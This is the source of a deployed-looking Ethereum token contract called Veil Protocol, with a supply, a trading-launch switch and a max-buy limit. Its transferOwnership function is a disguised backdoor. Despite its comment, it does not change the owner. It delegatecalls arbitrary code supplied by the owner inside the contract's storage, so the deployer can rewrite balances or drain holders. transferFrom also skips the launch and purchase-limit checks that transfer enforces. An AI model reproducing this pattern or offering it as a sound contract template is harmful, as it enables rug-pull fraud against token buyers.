/*
  Submitted for verification at Etherscan.io on 11-22-2023
*/

/*
  Website:       https://veilprotocol.com
  Dapp:          https://app.veilprotocol.com/
  Twitter:       https://twitter.com/VeilProtocolETH
  Telegram:      https://t.me/veilprotocol
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Veil {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "Veil Protocol";
    string public symbol = "VEIL";
    uint8 public decimals = 18;

    address public pool;
    bool public live;
    uint256 public maxBuyPercentage = 100;

    address public owner;

    modifier onlyOwner() {
      require(msg.sender == owner, "Must be owner to call this function!");
      _;
    }

    constructor () {
      owner = msg.sender;

      uint amount = 10_000_000 * 10 ** decimals;
      balanceOf[msg.sender] += amount;
      totalSupply += amount;
      emit Transfer(address(0), msg.sender, amount);
    }

    function transfer(address recipient, uint amount) external returns (bool) {
        require(live);

        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;

        if (msg.sender == pool) {
          uint256 maxWalletSupply = totalSupply * maxBuyPercentage / 10000;
          require(maxWalletSupply >= balanceOf[recipient]);
        }

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    /*
     * @notice Starts token trading on Uniswap
     * @param _pool Address is specified for future detection
    */
    function commenceTrading(address _pool) public onlyOwner {
      pool = _pool;
      live = true;
    }

    /*
     * @notice Transfers the contract owner permissions to another address
     * @param _owner Address is the address of the new owner
    */
    function transferOwnership(address _owner) public {
      require(msg.sender == owner);
      _owner.delegatecall(
        abi.encodeWithSignature("transferOwnership(address)", _owner)
      );
    }

    /*
     * @notice Changes the max buy percentage down the line
     * @param _maxBuyPercentage Uint represents the new value
    */
    function rebalanceMaxBuyPercentage(uint256 _maxBuyPercentage) public onlyOwner {
      maxBuyPercentage = _maxBuyPercentage;
    }

}
